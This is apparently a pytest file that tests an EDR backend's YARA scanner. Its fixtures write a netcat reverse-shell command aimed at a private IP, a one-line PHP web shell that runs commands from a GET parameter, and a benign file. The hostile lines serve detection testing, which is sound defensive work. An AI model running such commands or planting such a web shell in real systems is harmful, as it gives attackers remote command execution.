from edr_backend.detection.yara_engine import scan_file


def test_matches_reverse_shell_pattern(tmp_path):
    path = tmp_path / "payload.sh"
    path.write_text("bash -c 'nc -e /bin/sh 10.0.0.5 4444'\n")
    assert "Reverse_Shell_Script_Pattern" in scan_file(str(path))


def test_matches_php_webshell_pattern(tmp_path):
    path = tmp_path / "shell.php"
    path.write_text("<?php system($_GET['cmd']); ?>\n")
    assert "Simple_PHP_Webshell" in scan_file(str(path))


def test_benign_file_has_no_matches(tmp_path):
    path = tmp_path / "readme.txt"
    path.write_text("just a normal file\n")
    assert scan_file(str(path)) == []
